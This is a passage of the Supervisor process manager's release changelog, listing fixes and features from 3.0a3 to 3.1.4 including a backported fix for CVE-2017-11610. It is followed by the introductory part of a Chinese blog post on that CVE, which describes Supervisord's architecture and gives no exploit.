- Errors caused by bad values in a config file now show the config section to make debugging easier. Patch by Marc Abramowitz.
- Setting ``redirect\_stderr=true`` in an ``[eventlistener:x]`` section is now disallowed because any messages written to ``stderr`` would interfere with the eventlistener protocol on ``stdout``.
- Fixed a bug where spawning a process could cause ``supervisord`` to crash if an ``IOError`` occurred while setting up logging. One way this could happen is if a log filename was accidentally set to a directory instead of a file. Thanks to Grzegorz Nosek for reporting this issue.
- Fixed a bug introduced in 3.1.0 where ``supervisord`` could crash when attempting to display a resource limit error.
- Fixed a bug where ``supervisord`` could crash with the message ``Assertion failed for processname: RUNNING not in STARTING`` if a time change caused the last start time of the process to be in the future. Thanks to Róbert Nagy, Sergey Leschenko, and samhair for the patches.
- A warning is now logged if an eventlistener enters the UNKNOWN state, which usually indicates a bug in the eventlistener. Thanks to Steve Winton and detailyang for reporting issues that led to this change.
- Errors from the web interface are now logged at the ``ERROR`` level. Previously, they were logged at the ``TRACE`` level and easily missed. Thanks to Thomas Güttler for reporting this issue.
- Fixed ``DeprecationWarning: Parameters to load are deprecated. Call .resolve and .require separately.`` on setuptools >= 11.3.
- If ``redirect\_stderr=true`` and ``stderr\_logfile=auto``, no stderr log file will be created. In previous versions, an empty stderr log file would be created. Thanks to Łukasz Kożuchowski for the initial patch.
- Fixed an issue in Medusa that would cause ``supervisorctl tail -f`` to disconnect if many other ``supervisorctl`` commands were run in parallel. Patch by Stefan Friesel.
3.1.4 (2017-07-24)------------------
- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.1.3 (2014-10-28)------------------
- Fixed an XML-RPC bug where the ElementTree-based parser handled strings like ``<value><string>hello</string></value>`` but not strings like ``<value>hello</value>``, which are valid in the XML-RPC spec. This fixes compatibility with the Apache XML-RPC client for Java and possibly other clients.
3.1.2 (2014-09-07)------------------
- Fixed a bug where ``tail group:\*`` in ``supervisorctl`` would show a 500 Internal Server Error rather than a BAD\_NAME fault.
- Fixed a bug where the web interface would show a 500 Internal Server Error instead of an error message for some process start faults.
- Removed medusa files not used by Supervisor.
3.1.1 (2014-08-11)------------------
- Fixed a bug where ``supervisorctl tail -f name`` output would stop if log rotation occurred while tailing.
- Prevent a crash when a greater number file descriptors were attempted to be opened than permitted by the environment when starting a bunch of programs. Now, instead a spawn error is logged.
- Compute "channel delay" properly, fixing symptoms where a supervisorctl start command would hang for a very long time when a process (or many processes) are spewing to their stdout or stderr. See comments attached to https://github.com/Supervisor/supervisor/pull/263 .
- Added ``docs/conf.py``, ``docs/Makefile``, and ``supervisor/scripts/\*.py`` to the release package.
3.1.0 (2014-07-29)------------------
- The output of the ``start``, ``stop``, ``restart``, and ``clear`` commands in ``supervisorctl`` has been changed to be consistent with the ``status`` command. Previously, the ``status`` command would show a process like ``foo:foo\_01`` but starting that process would show ``foo\_01: started`` (note the group prefix ``foo:`` was missing). Now, starting the process will show ``foo:foo\_01: started``. Suggested by Chris Wood.
- The ``status`` command in ``supervisorctl`` now supports group name syntax: ``status group:\*``.
- The process column in the table output by the ``status`` command in ``supervisorctl`` now expands to fit the widest name.
- The ``update`` command in ``supervisorctl`` now accepts optional group names. When group names are specified, only those groups will be updated. Patch by Gary M. Josack.
- Tab completion in ``supervisorctl`` has been improved and now works for more cases. Thanks to Mathieu Longtin and Marc Abramowitz for the patches.
- Attempting to start or stop a process group in ``supervisorctl`` with the ``group:\*`` syntax will now show the same error message as the ``process`` syntax if the name does not exist. Previously, it would show a Python exception. Patch by George Ang.
- Added new ``PROCESS\_GROUP\_ADDED`` and ``PROCESS\_GROUP\_REMOVED`` events. These events are fired when process groups are added or removed from Supervisor's runtime configuration when using the ``add`` and ``remove`` commands in ``supervisorctl``. Patch by Brent Tubbs.
- Stopping a process in the backoff state now changes it to the stopped state. Previously, an attempt to stop a process in backoff would be ignored. Patch by Pascal Varet.
- The ``directory`` option is now expanded separately for each process in a homogeneous process group. This allows each process to have its own working directory. Patch by Perttu Ranta-aho.
- Removed ``setuptools`` from the ``requires`` list in ``setup.py`` because it caused installation issues on some systems.
- Fixed a bug in Medusa where the HTTP Basic authorizer would cause an exception if the password contained a colon. Thanks to Thomas Güttler for reporting this issue.
- Fixed an XML-RPC bug where calling supervisor.clearProcessLogs() with a name like ``group:\*`` would cause a 500 Internal Server Error rather than returning a BAD\_NAME fault.
- Fixed a hang that could occur in ``supervisord`` if log rotation is used and an outside program deletes an active log file. Patch by Magnus Lycka.
- A warning is now logged if a glob pattern in an ``[include]`` section does not match any files. Patch by Daniel Hahler.
3.0.1 (2017-07-24)------------------
- Backported from Supervisor 3.3.3: Fixed CVE-2017-11610. A vulnerability was found where an authenticated client can send a malicious XML-RPC request to ``supervisord`` that will run arbitrary shell commands on the server. The commands will be run as the same user as ``supervisord``. Depending on how ``supervisord`` has been configured, this may be root. See https://github.com/Supervisor/supervisor/issues/964 for details.
3.0 (2013-07-30)----------------
- Parsing the config file will now fail with an error message if a process or group name contains characters that are not compatible with the eventlistener protocol.
- Fixed a bug where the ``tail -f`` command in ``supervisorctl`` would fail if the combined length of the username and password was over 56 characters.
- Reading the config file now gives a separate error message when the config file exists but can't be read. Previously, any error reading the file would be reported as "could not find config file". Patch by Jens Rantil.
- Fixed an XML-RPC bug where array elements after the first would be ignored when using the ElementTree-based XML parser. Patch by Zev Benjamin.
- Fixed the usage message output by ``supervisorctl`` to show the correct default config file path. Patch by Alek Storm.
3.0b2 (2013-05-28)------------------
- The behavior of the program option ``user`` has changed. In all previous versions, if ``supervisord`` failed to switch to the user, a warning would be sent to the stderr log but the child process would still be spawned. This means that a mistake in the config file could result in a child process being unintentionally spawned as root. Now, ``supervisord`` will not spawn the child unless it was able to successfully switch to the user. Thanks to Igor Partola for reporting this issue.
- If a user specified in the config file does not exist on the system, ``supervisord`` will now print an error and refuse to start.
- Reverted a change to logging introduced in 3.0b1 that was intended to allow multiple processes to log to the same file with the rotating log handler. The implementation caused supervisord to crash during reload and to leak file handles. Also, since log rotation options are given on a per-program basis, impossible configurations could be created (conflicting rotation options for the same file). Given this and that supervisord now has syslog support, it was decided to remove this feature. A warning was added to the documentation that two processes may not log to the same file.
- Fixed a bug where parsing ``command=`` could cause supervisord to crash if shlex.split() fails, such as a bad quoting. Patch by Scott Wilson.
- It is now possible to use ``supervisorctl`` on a machine with no ``supervisord.conf`` file by supplying the connection information in command line options. Patch by Jens Rantil.
- Fixed a bug where supervisord would crash if the syslog handler was used and supervisord received SIGUSR2 (log reopen request).
- Fixed an XML-RPC bug where calling supervisor.getProcessInfo() with a bad name would cause a 500 Internal Server Error rather than the returning a BAD\_NAME fault.
- Added a favicon to the web interface. Patch by Caio Ariede.
- Fixed a test failure due to incorrect handling of daylight savings time in the childutils tests. Patch by Ildar Hizbulin.
- Fixed a number of pyflakes warnings for unused variables, imports, and dead code. Patch by Philippe Ombredanne.
3.0b1 (2012-09-10)------------------
- Fixed a bug where parsing ``environment=`` did not verify that key/value pairs were correctly separated. Patch by Martijn Pieters.
- Fixed a bug in the HTTP server code that could cause unnecessary delays when sending large responses. Patch by Philip Zeyliger.
- When supervisord starts up as root, if the ``-c`` flag was not provided, a warning is now emitted to the console. Rationale: supervisord looks in the current working directory for a ``supervisord.conf`` file; someone might trick the root user into starting supervisord while cd'ed into a directory that has a rogue ``supervisord.conf``.
- A warning was added to the documentation about the security implications of starting supervisord without the ``-c`` flag.
- Add a boolean program option ``stopasgroup``, defaulting to false. When true, the flag causes supervisor to send the stop signal to the whole process group. This is useful for programs, such as Flask in debug mode, that do not propagate stop signals to their children, leaving them orphaned.
- Python 2.3 is no longer supported. The last version that supported Python 2.3 is Supervisor 3.0a12.
- Removed the unused "supervisor\_rpc" entry point from setup.py.
- Fixed a bug in the rotating log handler that would cause unexpected results when two processes were set to log to the same file. Patch by Whit Morriss.
- Fixed a bug in config file reloading where each reload could leak memory because a list of warning messages would be appended but never cleared. Patch by Philip Zeyliger.
- Added a new Syslog log handler. Thanks to Denis Bilenko, Nathan L. Smith, and Jason R. Coombs, who each contributed to the patch.
- Put all change history into a single file (CHANGES.txt).
3.0a12 (2011-12-06)-------------------
- Released to replace a broken 3.0a11 package where non-Python files were not included in the package.
3.0a11 (2011-12-06)-------------------
- Added a new file, ``PLUGINS.rst``, with a listing of third-party plugins for Supervisor. Contributed by Jens Rantil.
- The ``pid`` command in supervisorctl can now be used to retrieve the PIDs of child processes. See ``help pid``. Patch by Gregory Wisniewski.
- Added a new ``host\_node\_name`` expansion that will be expanded to the value returned by Python's ``platform.node`` (see http://docs.python.org/library/platform.html#platform.node). Patch by Joseph Kondel.
- Fixed a bug in the web interface where pages over 64K would be truncated. Thanks to Drew Perttula and Timothy Jones for reporting this.
- Renamed ``README.txt`` to ``README.rst`` so GitHub renders the file as ReStructuredText.
- The XML-RPC server is now compatible with clients that do not send empty <params> when there are no parameters for the method call. Thanks to Johannes Becker for reporting this.
- Fixed ``supervisorctl --help`` output to show the correct program name.
- The behavior of the configuration options ``minfds`` and ``minprocs`` has changed. Previously, if a hard limit was less than ``minfds`` or ``minprocs``, supervisord would unconditionally abort with an error. Now, supervisord will attempt to raise the hard limit. This may succeed if supervisord is run as root, otherwise the error is printed as before. Patch by Benoit Sigoure.
- Add a boolean program option ``killasgroup``, defaulting to false, if true when resorting to send SIGKILL to stop/terminate the process send it to its whole process group instead to take care of possible children as well and not leave them behind. Patch by Samuele Pedroni.
- Environment variables may now be used in the configuration file for options that support string expansion. Patch by Aleksey Sivokon.
- Fixed a race condition where supervisord might not act on a signal sent to it. Thanks to Adar Dembo for reporting the issue and supplying the initial patch.
- Updated the output of ``echo\_supervisord\_conf`` to fix typos and improve comments. Thanks to Jens Rantil for noticing these.
- Fixed a possible 500 Server Error from the web interface. This was observed when using Supervisor on a domain socket behind Nginx, where Supervisor would raise an exception because REMOTE\_ADDR was not set. Patch by David Bennett.
3.0a10 (2011-03-30)-------------------
- Fixed the stylesheet of the web interface so the footer line won't overlap a long process list. Thanks to Derek DeVries for the patch.
- Allow rpc interface plugins to register new events types.
- Bug fix for FCGI sockets not getting cleaned up when the ``reload`` command is issued from supervisorctl. Also, the default behavior has changed for FCGI sockets. They are now closed whenever the number of running processes in a group hits zero. Previously, the sockets were kept open unless a group-level stop command was issued.
- Better error message when HTTP server cannot reverse-resolve a hostname to an IP address. Previous behavior: show a socket error. Current behavior: spit out a suggestion to stdout.
- Environment variables set via ``environment=`` value within ``[supervisord]`` section had no effect. Thanks to Wyatt Baldwin for a patch.
- Fix bug where stopping process would cause process output that happened after the stop request was issued to be lost. See https://github.com/Supervisor/supervisor/issues/11.
- Moved 2.X change log entries into ``HISTORY.txt``.
- Converted ``CHANGES.txt`` and ``README.txt`` into proper ReStructuredText and included them in the ``long\_description`` in ``setup.py``.
- Added a tox.ini to the package (run via ``tox`` in the package dir). Tests supervisor on multiple Python versions.
3.0a9 (2010-08-13)------------------
- Use rich comparison methods rather than \_\_cmp\_\_ to sort process configs and process group configs to better straddle Python versions. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed test\_supervisorctl.test\_maintail\_dashf test for Python 2.7. (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Fixed the way that supervisor.datatypes.url computes a "good" URL for compatibility with Python 2.7 and Python >= 2.6.5. URLs with bogus "schemes://" will now be accepted as a version-straddling compromise (before they were rejected before supervisor would start). (thanks to Jonathan Riboux for identifying the problem and supplying an initial patch).
- Add a ``-v`` / ``--version`` option to supervisord: Print the supervisord version number out to stdout and exit. (Roger Hoover)
- Import iterparse from xml.etree when available (eg: Python 2.6). Patch by Sidnei da Silva.
- Fixed the url to the supervisor-users mailing list. Patch by Sidnei da Silva
- When parsing "environment=" in the config file, changes introduced in 3.0a8 prevented Supervisor from parsing some characters commonly found in paths unless quoting was used as in this example::
 environment=HOME='/home/auser'
 Supervisor once again allows the above line to be written as::
 environment=HOME=/home/auser
 Alphanumeric characters, "\_", "/", ".", "+", "-", "(", ")", and ":" can all be used as a value without quoting. If any other characters are needed in the value, please quote it as in the first example above. Thanks to Paul Heideman for reporting this issue.
- Supervisor will now look for its config file in locations relative to the executable path, allowing it to be used more easily in virtual environments. If sys.argv[0] is ``/path/to/venv/bin/supervisorctl``, supervisor will now look for it's config file in ``/path/to/venv/etc/supervisord.conf`` and ``/path/to/venv/supervisord.conf`` in addition to the other standard locations. Patch by Chris Rossi.
3.0a8 (2010-01-20)------------------
- Don't cleanup file descriptors on first supervisord invocation: this is a lame workaround for Snow Leopard systems that use libdispatch and are receiving "Illegal instruction" messages at supervisord startup time. Restarting supervisord via "supervisorctl restart" may still cause a crash on these systems.
- Got rid of Medusa hashbang headers in various files to ease RPM packaging.
- Allow umask to be 000 (patch contributed by Rowan Nairn).
- Fixed a bug introduced in 3.0a7 where supervisorctl wouldn't ask for a username/password combination properly from a password-protected supervisord if it wasn't filled in within the "[supervisorctl]" section username/password values. It now properly asks for a username and password.
- Fixed a bug introduced in 3.0a7 where setup.py would not detect the Python version correctly. Patch by Daniele Paolella.
- Fixed a bug introduced in 3.0a7 where parsing a string of key/value pairs failed on Python 2.3 due to use of regular expression syntax introduced in Python 2.4.
- Removed the test suite for the ``memmon`` console script, which was moved to the Superlance package in 3.0a7.
- Added release dates to CHANGES.txt.
- Reloading the config for an fcgi process group did not close the fcgi socket - now, the socket is closed whenever the group is stopped as a unit (including during config update). However, if you stop all the processes in a group individually, the socket will remain open to allow for graceful restarts of FCGI daemons. (Roger Hoover)
- Rereading the config did not pick up changes to the socket parameter in a fcgi-program section. (Roger Hoover)
- Made a more friendly exception message when a FCGI socket cannot be created. (Roger Hoover)
- Fixed a bug where the --serverurl option of supervisorctl would not accept a URL with a "unix" scheme. (Jason Kirtland)
- Running the tests now requires the "mock" package. This dependency has been added to "tests\_require" in setup.py. (Roger Hoover)
- Added support for setting the ownership and permissions for an FCGI socket. This is done using new "socket\_owner" and "socket\_mode" options in an [fcgi-program:x] section. See the manual for details. (Roger Hoover)
- Fixed a bug where the FCGI socket reference count was not getting decremented on spawn error. (Roger Hoover)
- Fixed a Python 2.6 deprecation warning on use of the "sha" module.
- Updated ez\_setup.py to one that knows about setuptools 0.6c11.
- Running "supervisorctl shutdown" no longer dumps a Python backtrace when it can't connect to supervisord on the expected socket. Thanks to Benjamin Smith for reporting this.
- Removed use of collections.deque in our bundled version of asynchat because it broke compatibility with Python 2.3.
- The sample configuration output by "echo\_supervisord\_conf" now correctly shows the default for "autorestart" as "unexpected". Thanks to William Dode for noticing it showed the wrong value.
3.0a7 (2009-05-24)------------------
- We now bundle our own patched version of Medusa contributed by Jason Kirtland to allow Supervisor to run on Python 2.6. This was done because Python 2.6 introduced backwards incompatible changes to asyncore and asynchat in the stdlib.
- The console script ``memmon``, introduced in Supervisor 3.0a4, has been moved to Superlance (http://pypi.python.org/pypi/superlance). The Superlance package contains other useful monitoring tools designed to run under Supervisor.
- Supervisorctl now correctly interprets all of the error codes that can be returned when starting a process. Patch by Francesc Alted.
- New ``stdout\_events\_enabled`` and ``stderr\_events\_enabled`` config options have been added to the ``[program:x]``, ``[fcgi-program:x]``, and ``[eventlistener:x]`` sections. These enable the emitting of new PROCESS\_LOG events for a program. If unspecified, the default is False.
 If enabled for a subprocess, and data is received from the stdout or stderr of the subprocess while not in the special capture mode used by PROCESS\_COMMUNICATION, an event will be emitted.
 Event listeners can subscribe to either PROCESS\_LOG\_STDOUT or PROCESS\_LOG\_STDERR individually, or PROCESS\_LOG for both.
- Values for subprocess environment variables specified with environment= in supervisord.conf can now be optionally quoted, allowing them to contain commas. Patch by Tim Godfrey.
- Added a new event type, REMOTE\_COMMUNICATION, that is emitted by a new RPC method, supervisor.sendRemoteCommEvent().
- Patch for bug #268 (KeyError on ``here`` expansion for stdout/stderr\_logfile) from David E. Kindred.
- Add ``reread``, ``update``, and ``avail`` commands based on Anders Quist's ``online\_config\_reload.diff`` patch. This patch extends the "add" and "drop" commands with automagical behavior::
 In supervisorctl:
 supervisor> status bar RUNNING pid 14864, uptime 18:03:42 baz RUNNING pid 23260, uptime 0:10:16 foo RUNNING pid 14866, uptime 18:03:42 gazonk RUNNING pid 23261, uptime 0:10:16 supervisor> avail bar in use auto 999:999 baz in use auto 999:999 foo in use auto 999:999 gazonk in use auto 999:999 quux avail auto 999:999
 Now we add this to our conf:
 [group:zegroup] programs=baz,gazonk
 Then we reread conf:
 supervisor> reread baz: disappeared gazonk: disappeared quux: available zegroup: available supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux avail auto 999:999 zegroup:baz avail auto 999:999 zegroup:gazonk avail auto 999:999 supervisor> status bar RUNNING pid 14864, uptime 18:04:18 baz RUNNING pid 23260, uptime 0:10:52 foo RUNNING pid 14866, uptime 18:04:18 gazonk RUNNING pid 23261, uptime 0:10:52
 The magic make-it-so command:
 supervisor> update baz: stopped baz: removed process group gazonk: stopped gazonk: removed process group zegroup: added process group quux: added process group supervisor> status bar RUNNING pid 14864, uptime 18:04:43 foo RUNNING pid 14866, uptime 18:04:43 quux RUNNING pid 23561, uptime 0:00:02 zegroup:baz RUNNING pid 23559, uptime 0:00:02 zegroup:gazonk RUNNING pid 23560, uptime 0:00:02 supervisor> avail bar in use auto 999:999 foo in use auto 999:999 quux in use auto 999:999 zegroup:baz in use auto 999:999 zegroup:gazonk in use auto 999:999
- Fix bug with symptom "KeyError: 'process\_name'" when using a logfile name including documented``process\_name`` Python string expansions.
- Tab completions in the supervisorctl shell, and a foreground mode for Supervisor, implemented as a part of GSoC. The supervisorctl program now has a ``fg`` command, which makes it possible to supply inputs to a process, and see its output/error stream in real time.
- Process config reloading implemented by Anders Quist. The supervisorctl program now has the commands "add" and "drop". "add <programname>" adds the process group implied by <programname> in the config file. "drop <programname>" removes the process group from the running configuration (it must already be stopped). This makes it possible to add processes to and remove processes from a running supervisord without restarting the supervisord process.
- Fixed a bug where opening the HTTP servers would fail silently for socket errors other than errno.EADDRINUSE.
- Thanks to Dave Peticolas, using "reload" against a supervisord that is running in the background no longer causes supervisord to crash.
- Configuration options for logfiles now accept mixed case reserved words (e.g. "AUTO" or "auto") for consistency with other options.
- childutils.eventdata was buggy, it could not deal with carriage returns in data. See http://www.plope.com/software/collector/257. Thanks to Ian Bicking.
- Per-process exitcodes= configuration now will not accept exit codes that are not 8-bit unsigned integers (supervisord will not start when one of the exit codes is outside the range of 0 - 255).
- Per-process ``directory`` value can now contain expandable values like ``%(here)s``. (See http://www.plope.com/software/collector/262).
- Accepted patch from Roger Hoover to allow for a new sort of process group: "fcgi-program". Adding one of these to your supervisord.conf allows you to control fastcgi programs. FastCGI programs cannot belong to heterogenous groups.
 The configuration for FastCGI programs is the same as regular programs except an additional "socket" parameter. Substitution happens on the socket parameter with the ``here`` and ``program\_name`` variables::
 [fcgi-program:fcgi\_test] ;socket=tcp://localhost:8002 socket=unix:///path/to/fcgi/socket
- Supervisorctl now supports a plugin model for supervisorctl commands.
- Added the ability to retrieve supervisord's own pid through supervisor.getPID() on the XML-RPC interface or a new "pid" command on supervisorctl.
3.0a6 (2008-04-07)------------------
- The RotatingFileLogger had a race condition in its doRollover method whereby a file might not actually exist despite a call to os.path.exists on the line above a place where we try to remove it. We catch the exception now and ignore the missing file.
3.0a5 (2008-03-13)------------------
- Supervisorctl now supports persistent readline history. To enable, add "history\_file = <pathname>" to the ``[supervisorctl]`` section in your supervisord.conf file.
- Multiple commands may now be issued on one supervisorctl command line, e.g. "restart prog; tail -f prog". Separate commands with a single semicolon; they will be executed in order as you would expect.
3.0a4 (2008-01-30)------------------
- 3.0a3 broke Python 2.3 backwards compatibility.
- On Debian Sarge, one user reported that a call to options.mktempfile would fail with an "[Errno 9] Bad file descriptor" at supervisord startup time. I was unable to reproduce this, but we found a workaround that seemed to work for him and it's included in this release. See http://www.plope.com/software/collector/252 for more information. Thanks to William Dode.
- The fault ``ALREADY\_TERMINATED`` has been removed. It was only raised by supervisor.sendProcessStdin(). That method now returns ``NOT\_RUNNING`` for parity with the other methods. (Mike Naberezny)
- The fault TIMED\_OUT has been removed. It was not used.
- Supervisor now depends on meld3 0.6.4, which does not compile its C extensions by default, so there is no more need to faff around with NO\_MELD3\_EXTENSION\_MODULES during installation if you don't have a C compiler or the Python development libraries on your system.
- Instead of making a user root around for the sample.conf file, provide a convenience command "echo\_supervisord\_conf", which he can use to echo the sample.conf to his terminal (and redirect to a file appropriately). This is a new user convenience (especially one who has no Python experience).
- Added ``numprocs\_start`` config option to ``[program:x]`` and ``[eventlistener:x]`` sections. This is an offset used to compute the first integer that ``numprocs`` will begin to start from. Contributed by Antonio Beamud Montero.
- Added capability for ``[include]`` config section to config format. This section must contain a single key "files", which must name a space-separated list of file globs that will be included in supervisor's configuration. Contributed by Ian Bicking.
- Invoking the ``reload`` supervisorctl command could trigger a bug in supervisord which caused it to crash. See http://www.plope.com/software/collector/253 . Thanks to William Dode for a bug report.
- The ``pidproxy`` script was made into a console script.
- The ``password`` value in both the ``[inet\_http\_server]`` and ``[unix\_http\_server]`` sections can now optionally be specified as a SHA hexdigest instead of as cleartext. Values prefixed with ``{SHA}`` will be considered SHA hex digests. To encrypt a password to a form suitable for pasting into the configuration file using Python, do, e.g.::
 >>> import sha >>> '{SHA}' + sha.new('thepassword').hexdigest() '{SHA}82ab876d1387bfafe46cc1c8a2ef074eae50cb1d'
- The subtypes of the events PROCESS\_STATE\_CHANGE (and PROCESS\_STATE\_CHANGE itself) have been removed, replaced with a simpler set of PROCESS\_STATE subscribable event types.
 The new event types are:
 PROCESS\_STATE\_STOPPED PROCESS\_STATE\_EXITED PROCESS\_STATE\_STARTING PROCESS\_STATE\_STOPPING PROCESS\_STATE\_BACKOFF PROCESS\_STATE\_FATAL PROCESS\_STATE\_RUNNING PROCESS\_STATE\_UNKNOWN PROCESS\_STATE # abstract
 PROCESS\_STATE\_STARTING replaces:
 PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_STOPPED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_BACKOFF PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_EXITED PROCESS\_STATE\_CHANGE\_STARTING\_FROM\_FATAL
 PROCESS\_STATE\_RUNNING replaces PROCESS\_STATE\_CHANGE\_RUNNING\_FROM\_STARTED
 PROCESS\_STATE\_BACKOFF replaces PROCESS\_STATE\_CHANGE\_BACKOFF\_FROM\_STARTING
 PROCESS\_STATE\_STOPPING replaces:
 PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_RUNNING PROCESS\_STATE\_CHANGE\_STOPPING\_FROM\_STARTING
 PROCESS\_STATE\_EXITED replaces PROCESS\_STATE\_CHANGE\_EXITED\_FROM\_RUNNING
 PROCESS\_STATE\_STOPPED replaces PROCESS\_STATE\_CHANGE\_STOPPED\_FROM\_STOPPING
 PROCESS\_STATE\_FATAL replaces PROCESS\_STATE\_CHANGE\_FATAL\_FROM\_BACKOFF
 PROCESS\_STATE\_UNKNOWN replaces PROCESS\_STATE\_CHANGE\_TO\_UNKNOWN
 PROCESS\_STATE replaces PROCESS\_STATE\_CHANGE
 The PROCESS\_STATE\_CHANGE\_EXITED\_OR\_STOPPED abstract event is gone.
 All process state changes have at least "processname", "groupname", and "from\_state" (the name of the previous state) in their serializations.
 PROCESS\_STATE\_EXITED additionally has "expected" (1 or 0) and "pid" (the process id) in its serialization.
 PROCESS\_STATE\_RUNNING, PROCESS\_STATE\_STOPPING, PROCESS\_STATE\_STOPPED additionally have "pid" in their serializations.
 PROCESS\_STATE\_STARTING and PROCESS\_STATE\_BACKOFF have "tries" in their serialization (initially "0", bumped +1 each time a start retry happens).
- Remove documentation from README.txt, point people to http://supervisord.org/manual/ .
- The eventlistener request/response protocol has changed. OK/FAIL must now be wrapped in a RESULT envelope so we can use it for more specialized communications.
 Previously, to signify success, an event listener would write the string ``OK\n`` to its stdout. To signify that the event was seen but couldn't be handled by the listener and should be rebuffered, an event listener would write the string ``FAIL\n`` to its stdout.
 In the new protocol, the listener must write the string::
 RESULT {resultlen}\n{result}
 For example, to signify OK::
 RESULT 2\nOK
 To signify FAIL::
 RESULT 4\nFAIL
 See the scripts/sample\_eventlistener.py script for an example.
- To provide a hook point for custom results returned from event handlers (see above) the [eventlistener:x] configuration sections now accept a "result\_handler=" parameter, e.g. "result\_handler=supervisor.dispatchers:default\_handler" (the default) or "handler=mypackage:myhandler". The keys are pkgutil "entry point" specifications (importable Python function names). Result handlers must be callables which accept two arguments: one named "event" which represents the event, and the other named "result", which represents the listener's result. A result handler either executes successfully or raises an exception. If it raises a supervisor.dispatchers.RejectEvent exception, the event will be rebuffered, and the eventhandler will be placed back into the ACKNOWLEDGED state. If it raises any other exception, the event handler will be placed in the UNKNOWN state. If it does not raise any exception, the event is considered successfully processed. A result handler's return value is ignored. Writing a result handler is a "in case of emergency break glass" sort of thing, it is not something to be used for arbitrary business code. In particular, handlers \*must not block\* for any appreciable amount of time.
 The standard eventlistener result handler (supervisor.dispatchers:default\_handler) does nothing if it receives an "OK" and will raise a supervisor.dispatchers.RejectEvent exception if it receives any other value.
- Supervisord now emits TICK events, which happen every N seconds. Three types of TICK events are available: TICK\_5 (every five seconds), TICK\_60 (every minute), TICK\_3600 (every hour). Event listeners may subscribe to one of these types of events to perform every-so-often processing. TICK events are subtypes of the EVENT type.
- Get rid of OSX platform-specific memory monitor and replace with memmon.py, which works on both Linux and Mac OS. This script is now a console script named "memmon".
- Allow "web handler" (the handler which receives http requests from browsers visiting the web UI of supervisor) to deal with POST requests.
- RPC interface methods stopProcess(), stopProcessGroup(), and stopAllProcesses() now take an optional "wait" argument that defaults to True for parity with the start methods.
3.0a3 (2007-10-02)------------------
- Supervisorctl now reports a better error message when the main supervisor XML-RPC namespace is not registered. Thanks to Mike Orr for reporting this. (Mike Naberezny)
- Create ``scripts`` directory within supervisor package, move ``pidproxy.py`` there, and place sample event listener and comm event programs within the directory.
- When an event notification is buffered (either because a listener rejected it or because all listeners were busy when we attempted to send it originally), we now rebuffer it in a way that will result in it being retried earlier than it used to be.
- When a listener process exits (unexpectedly) before transitioning from the BUSY state, rebuffer the event that was being processed.
- supervisorctl ``tail`` command now accepts a trailing specifier: ``stderr`` or ``stdout``, which respectively, allow a user to tail the stderr or stdout of the named process. When this specifier is not provided, tail defaults to stdout.
- supervisor ``clear`` command now clears both stderr and stdout logs for the given process.
- When a process encounters a spawn error as a result of a failed execve or when it cannot setuid to a given uid, it now puts this info into the process' stderr log rather than its stdout log.
- The event listener protocol header now contains the ``server`` identifier, the ``pool`` that the event emanated from, and the ``poolserial`` as well as the values it previously contained (version, event name, serial, and length). The server identifier is taken from the config file options value ``identifier``, the ``pool`` value is the name of the listener pool that this event emanates from, and the ``poolserial`` is a serial number assigned to the event local to the pool that is processing it.
- The event listener protocol header is now a sequence of key-value pairs rather than a list of positional values. Previously, a representative header looked like::
 SUPERVISOR3.0 PROCESS\_COMMUNICATION\_STDOUT 30 22\n
 Now it looks like::
 ver:3.0 server:supervisor serial:21 ...
- Specific event payload serializations have changed. All event types that deal with processes now include the pid of the process that the event is describing. In event serialization "header" values, we've removed the space between the header name and the value and headers are now separated by a space instead of a line feed. The names of keys in all event types have had underscores removed.
- Abandon the use of the Python stdlib ``logging`` module for speed and cleanliness purposes. We've rolled our own.
- Fix crash on start if AUTO logging is used with a max\_bytes of zero for a process.
- Improve process communication event performance.
- The process config parameters ``stdout\_capturefile`` and ``stderr\_capturefile`` are no longer valid. They have been replaced with the ``stdout\_capture\_maxbytes`` and ``stderr\_capture\_maxbytes`` parameters, which are meant to be suffix-multiplied integers. They both default to zero. When they are zero, process communication event capturing is not performed. When either is nonzero, the value represents the maximum number of bytes that will be captured between process event start and end tags. This change was to support the fact that we no longer keep capture data in a separate file, we just use a FIFO in RAM to maintain capture info. For users whom don't care about process communication events, or whom haven't changed the defaults for ``stdout\_capturefile`` or ``stderr\_capturefile``, they needn't do anything to their configurations to deal with this change.
- Log message levels have been normalized. In particular, process stdin/stdout is now logged at ``debug`` level rather than at ``trace`` level (``trace`` level is now reserved for output useful typically for debugging supervisor itself). See "Supervisor Log Levels" in the documentation for more info.
- When an event is rebuffered (because all listeners are busy or a listener rejected the event), the rebuffered event is now inserted in the head of the listener event queue. This doesn't guarantee event emission in natural ordering, because if a listener rejects an event or dies while it's processing an event, it can take an arbitrary amount of time for the event to be rebuffered, and other events may be processed in the meantime. But if pool listeners never reject an event or don't die while processing an event, this guarantees that events will be emitted in the order that they were[View remainder of file in raw view](https://github.com/Supervisor/supervisor/raw/refs/tags/3.2.4/CHANGES.txt)

# Supervisord远程命令执行漏洞（CVE-2017-11610）

phithon

Aug 03, 2017, 10:24 PM

阅读：33100

[网络安全](/sort/PENETRATION)

[supervisord](/tag/supervisord),
[命令执行漏洞](/tag/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E)

前几天Supervisord出现了一个需认证的远程命令执行漏洞（CVE-2017-11610），在对其进行分析以后，将靶场加入了Vulhub豪华套餐： <https://github.com/phith0n/vulhub/tree/master/supervisor/CVE-2017-11610>

## [Supervisord](#supervisord)

Supervisord是一款Python开发，用于管理后台应用（服务）的工具，其角色类似于Linux自带的Systemd。

我觉得它相比Systemd有几个特点：

1. 配置比较简单
2. 一个简单的第三方应用，与系统没有耦合
3. 提供HTTP API，支持远程操作

所以，我之前把他用来跑一些Web应用。

Supervisord的架构分为Server和Client，Server以一个服务的形式，跑在系统后台，而Client是一个命令行工具，其实就是根据用户的要求，调用Server提供的API，执行一些工作。

